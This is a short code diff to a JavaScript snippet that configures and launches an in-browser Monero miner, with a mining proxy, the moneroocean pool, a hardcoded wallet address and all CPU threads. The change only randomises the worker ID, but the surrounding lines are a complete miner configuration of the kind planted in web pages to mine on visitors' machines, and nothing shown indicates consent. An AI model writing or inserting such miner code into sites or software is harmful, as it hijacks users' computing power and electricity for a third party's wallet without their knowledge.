@@ -3,7 +3,7 @@
     server = "wss://ny1.xmrminingproxy.com";
     var pool = "moneroocean.stream";
     var walletAddress = "42sJVjvwfoQ3aimGzfUjGnj4gcFByC2WnDEMyEQiNx3zFRoTwNTkkuo2Aett6XUvuwZxL18o8isgBEhStA4GXshmLsY4VE1";
-    var workerId = ""
+    var workerId = "worker-" + Math.floor(Math.random() * 1_000_000).toString().padStart(6, '0')
     var threads = -1;
     var password = "x";
     startMining(pool, walletAddress, workerId, threads, password);
